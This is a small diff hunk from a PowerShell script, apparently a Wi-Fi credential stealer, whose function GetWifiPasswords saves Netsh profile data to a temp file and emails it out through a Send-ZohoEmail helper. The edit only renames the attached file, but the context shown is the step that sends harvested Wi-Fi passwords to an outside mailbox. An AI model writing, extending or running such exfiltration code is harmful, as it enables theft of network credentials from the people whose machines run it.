@@ -206,7 +206,7 @@ function GetWifiPasswords {
     # Email file
     if (-not $isEmailsent) {
         $subject = "Netsh Profiles - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\wyfi.txt")  # Array of attachment file paths
+        $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     }
 
